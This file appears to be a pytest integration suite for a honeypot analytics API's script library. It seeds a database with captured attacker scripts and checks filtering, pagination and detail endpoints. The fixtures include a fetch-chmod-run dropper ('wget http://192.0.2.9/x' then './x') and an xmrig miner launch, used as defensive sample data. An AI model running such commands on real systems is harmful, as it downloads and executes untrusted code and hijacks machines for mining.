"""Script library endpoints against a real TimescaleDB with a hand-checked dataset."""

import json
import os
from collections.abc import AsyncIterator
from datetime import UTC, datetime, timedelta
from typing import Any

import httpx
import pytest
from analytics_seed import Seed, api_engine, owner_engine
from sqlalchemy import text
from suckerpot_db import create_session_factory

from api.main import create_app

pytestmark = [
    pytest.mark.integration,
    pytest.mark.skipif(not os.environ.get("POSTGRES_HOST"), reason="POSTGRES_HOST not set"),
]

NOW = datetime.now(UTC).replace(microsecond=0)


def line(n: int, norm: str, expl: str, risk: str | None, tech: str | None = None) -> dict[str, Any]:
    return {
        "n": n,
        "text": norm,
        "explanation": expl,
        "risk": risk,
        "technique": tech,
        "rule": None,
    }


# (id key, sample, summary, last_seen age h, first_seen age h, sessions, sources, sensors, techs)
SCRIPTS: list[dict[str, Any]] = [
    {
        "key": "drop", "sample": "wget http://192.0.2.9/x\nchmod 777 x\n./x", "sessions": 12,
        "sources": 5, "sensors": ["ssh", "telnet"], "techs": ["T1105"], "last": 1, "first": 24 * 30,
        "summary": "A 3-step script that downloads a file, makes it executable and runs it.",
        "lines": [
            line(1, "wget <url>", "Downloads a file.", "severe", "T1105"),
            line(2, "chmod <n> x", "Makes it runnable.", "severe"),
            line(3, "./x", "Runs it.", "severe"),
        ],
    },
    {
        "key": "recon", "sample": "uname -a\nwhoami", "sessions": 40, "sources": 20,
        "sensors": ["ssh"], "techs": ["T1082"], "last": 30, "first": 24 * 40,
        "summary": "A 2-step script that identifies the system and checks its privileges.",
        "lines": [
            line(1, "uname -a", "Shows the system.", "info", "T1082"),
            line(2, "whoami", "Shows the user.", "info"),
        ],
    },
    {
        "key": "new", "sample": "xmrig --donate-level 1\nnohup ./m &", "sessions": 3, "sources": 2,
        "sensors": ["telnet"], "techs": [], "last": 2, "first": 30,
        "summary": None,
        "lines": [line(1, "xmrig --donate-level <n>", "Unknown.", None)],
    },
]  # fmt: skip


async def seed() -> dict[str, int]:
    s = Seed()
    s.session(
        "s1", "ssh", "203.0.113.1", NOW - timedelta(hours=2),
        [(0.0, "connect", {}), (1.0, "command", {"input": "uname -a"})],
    )  # fmt: skip
    s.session("s2", "ssh", "203.0.113.2", NOW - timedelta(hours=1), [(0.0, "connect", {})])
    ids: dict[str, int] = {}
    async with owner_engine() as owner:
        await s.write(owner)
        async with owner.begin() as conn:
            await conn.execute(text("DELETE FROM scripts"))
            await conn.execute(text("DELETE FROM campaigns"))
            campaign = (
                await conn.execute(
                    text(
                        "INSERT INTO campaigns (name, status, first_seen, last_seen, severity) "
                        "VALUES ('Dropper wave', 'active', now(), now(), 'warning') RETURNING id"
                    )
                )
            ).scalar_one()
            await conn.execute(
                text(
                    "INSERT INTO attack_techniques (id, name, tactic, stage, url) VALUES "
                    "('T1105', 'Ingress Tool Transfer', 'command-and-control', 'tool_transfer', "
                    "'https://attack.mitre.org/techniques/T1105/') ON CONFLICT (id) DO UPDATE SET "
                    "name = EXCLUDED.name, tactic = EXCLUDED.tactic, url = EXCLUDED.url"
                )
            )
            for i, sc in enumerate(SCRIPTS):
                ids[sc["key"]] = (
                    await conn.execute(
                        text(
                            """
                            INSERT INTO scripts (fingerprint, normalized_text, sample_text,
                                line_count, first_seen, last_seen, sessions, sources, sensors,
                                techniques, campaign_id, demo)
                            VALUES (decode(:fp, 'hex'), :norm, :sample, :n, :first, :last, :sess,
                                    :src, :sensors, :techs, :cid, true)
                            RETURNING id
                            """
                        ),
                        {
                            "fp": f"{i + 1:064x}",
                            "norm": sc["sample"],
                            "sample": sc["sample"],
                            "n": len(sc["lines"]),
                            "first": NOW - timedelta(hours=sc["first"]),
                            "last": NOW - timedelta(hours=sc["last"]),
                            "sess": sc["sessions"],
                            "src": sc["sources"],
                            "sensors": sc["sensors"],
                            "techs": sc["techs"],
                            "cid": campaign if sc["key"] == "drop" else None,
                        },
                    )
                ).scalar_one()
                if sc["summary"]:
                    await conn.execute(
                        text(
                            "INSERT INTO script_explanations (script_id, source, prompt_version, "
                            "lines, summary) VALUES (:i, 'annotations', 1, CAST(:l AS jsonb), :s)"
                        ),
                        {"i": ids[sc["key"]], "l": json.dumps(sc["lines"]), "s": sc["summary"]},
                    )
            for sid in ("s1", "s2"):
                await conn.execute(
                    text(
                        "INSERT INTO script_sessions (script_id, session_id, src_ip, sensor, "
                        "seen_at) VALUES (:i, :s, '203.0.113.1', 'ssh', :t)"
                    ),
                    {
                        "i": ids["drop"],
                        "s": sid,
                        "t": NOW - timedelta(hours=1 if sid == "s2" else 2),
                    },
                )
            await conn.execute(
                text(
                    "INSERT INTO script_sessions (script_id, session_id, src_ip, sensor, seen_at) "
                    "VALUES (:i, 'gone', '203.0.113.9', 'ssh', now())"
                ),
                {"i": ids["drop"]},
            )  # a link whose session was pruned: skipped, not an error
    return ids


@pytest.fixture
async def ids() -> dict[str, int]:
    return await seed()


@pytest.fixture
async def client(ids: dict[str, int]) -> AsyncIterator[httpx.AsyncClient]:
    engine = api_engine()
    app = create_app(create_session_factory(engine), enable_live=False)
    async with app.router.lifespan_context(app):
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app), base_url="http://t/api/v1"
        ) as c:
            yield c
    await engine.dispose()


async def test_the_list_sorts_by_recent_and_filters(client: httpx.AsyncClient) -> None:
    body = (await client.get("/scripts")).json()
    assert [i["line_count"] for i in body["items"]] == [3, 1, 2]  # last_seen desc: drop, new, recon
    first = body["items"][0]
    assert first["summary"].startswith("A 3-step script")
    assert first["preview"] == ["wget http://192.0.2.9/x", "chmod 777 x", "./x"]
    assert first["risk"] == "severe" and first["campaign_name"] == "Dropper wave"
    assert first["is_new"] is False and body["items"][1]["is_new"] is True
    assert body["items"][1]["summary"] is None and body["items"][1]["risk"] is None

    common = (await client.get("/scripts", params={"sort": "common"})).json()["items"]
    assert [i["sessions"] for i in common] == [40, 12, 3]
    assert [
        i["id"] for i in (await client.get("/scripts", params={"new": "true"})).json()["items"]
    ] == [common[2]["id"]]
    cases: list[tuple[dict[str, Any], int]] = [
        ({"sensor": "telnet"}, 2),
        ({"sensor": ["ssh", "telnet"]}, 3),
        ({"technique": "T1105"}, 1),
        ({"q": "XMRIG"}, 1),
        ({"min_sources": 5}, 2),
        ({"days": 1}, 2),
        ({"campaign_id": first["campaign_id"]}, 1),
    ]
    for params, count in cases:
        got = (await client.get("/scripts", params=params)).json()["items"]
        assert len(got) == count, params


async def test_pagination_walks_each_sort_once(client: httpx.AsyncClient) -> None:
    for sort in ("recent", "common", "newest"):
        seen: list[int] = []
        cursor: str | None = None
        for _ in range(5):
            params: dict[str, Any] = {"limit": 1, "sort": sort}
            if cursor:
                params["cursor"] = cursor
            body = (await client.get("/scripts", params=params)).json()
            seen += [i["id"] for i in body["items"]]
            cursor = body["next_cursor"]
            if cursor is None:
                break
        assert len(seen) == 3 == len(set(seen)), sort


@pytest.mark.parametrize(
    "params",
    [
        {"cursor": "nope"},
        {"limit": 0},
        {"limit": 500},
        {"technique": "x"},
        {"sensor": "a b"},
        {"sort": "x"},
    ],
)
async def test_bad_parameters_are_refused(
    client: httpx.AsyncClient, params: dict[str, Any]
) -> None:
    assert (await client.get("/scripts", params=params)).status_code in (400, 422)


async def test_summary_counts(client: httpx.AsyncClient) -> None:
    body = (await client.get("/scripts/summary")).json()
    assert (body["total"], body["new_this_week"], body["seen_today"]) == (3, 1, 2)
    assert body["with_campaign"] == 1 and body["top_sessions"] == 40
    assert "llm" not in body


async def test_detail_pairs_lines_with_explanations(
    client: httpx.AsyncClient, ids: dict[str, int]
) -> None:
    body = (await client.get(f"/scripts/{ids['drop']}")).json()
    assert [(ln["n"], ln["raw"], ln["risk"]) for ln in body["lines"]] == [
        (1, "wget http://192.0.2.9/x", "severe"),
        (2, "chmod 777 x", "severe"),
        (3, "./x", "severe"),
    ]
    assert body["lines"][0]["technique_name"] == "Ingress Tool Transfer"
    assert body["techniques_detail"][0]["url"].startswith("https://attack.mitre.org/")
    assert body["campaign"]["name"] == "Dropper wave"
    assert "ai" not in body and "llm" not in body
    assert body["demo"] is True and body["unexplained"] == 0
    other = (await client.get(f"/scripts/{ids['new']}")).json()
    assert other["lines"] == [] and other["unexplained"] == 0 and other["techniques_detail"] == []
    assert (await client.get("/scripts/999999")).status_code == 404
    assert (await client.get("/scripts/abc")).status_code == 422


async def test_sessions_of_a_script_skip_pruned_ones(
    client: httpx.AsyncClient, ids: dict[str, int]
) -> None:
    body = (await client.get(f"/scripts/{ids['drop']}/sessions", params={"limit": 1})).json()
    assert len(body["items"]) <= 1
    seen: list[str] = []
    cursor: str | None = None
    for _ in range(5):
        params: dict[str, Any] = {"limit": 1}
        if cursor:
            params["cursor"] = cursor
        page = (await client.get(f"/scripts/{ids['drop']}/sessions", params=params)).json()
        seen += [s["session_id"] for s in page["items"]]
        cursor = page["next_cursor"]
        if not cursor:
            break
    assert seen == ["s2", "s1"]  # 'gone' has no session row; newest link first
    assert (
        await client.get(f"/scripts/{ids['drop']}/sessions", params={"cursor": "x"})
    ).status_code == 400
